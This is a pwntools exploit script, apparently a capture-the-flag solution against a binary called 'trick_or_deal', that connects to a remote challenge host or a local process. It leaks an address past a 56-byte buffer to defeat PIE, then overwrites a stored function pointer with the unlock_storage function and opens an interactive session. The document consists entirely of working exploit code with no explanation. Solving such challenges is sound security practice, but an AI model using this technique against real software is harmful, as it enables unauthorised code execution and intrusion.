from pwn import *

# b *buy+103
gs = '''
b *make_offer+252
continue
'''

elf = context.binary = ELF("./trick_or_deal")

def start():
    if args.REMOTE:
        return remote("94.237.53.113", 54282)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendlineafter("? ", b"2")

payload = b"".join([
    b"A"*56,
])

io.sendafter("? ", payload)

io.recvuntil(b"A"*56)

leak_address = u64(io.recvline().strip().ljust(8, b"\x00"))

print(f"[+] Leak Address {hex(leak_address)}")

elf.address = leak_address - elf.sym._start

io.sendlineafter("? ", b"4")

io.sendlineafter("? ", b"3")

io.sendlineafter(": ", b"y")

io.sendlineafter("? ", b"80")

new_storage = b"".join([
    b"A"*0x48,
    p64(elf.sym.unlock_storage)
])

io.sendafter("? ", new_storage)

io.sendlineafter("? ", b"1")

io.interactive()
